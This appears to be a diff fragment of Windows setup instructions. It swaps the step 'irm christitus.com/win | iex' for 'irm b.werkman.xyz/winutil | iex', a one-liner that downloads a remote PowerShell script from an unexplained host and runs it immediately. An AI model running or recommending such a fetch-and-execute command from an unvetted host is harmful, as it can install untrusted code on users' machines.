@@ -29,5 +29,5 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection
   ```
   3. Run:
   ```
-  irm christitus.com/win | iex
+  irm b.werkman.xyz/winutil | iex
   ```
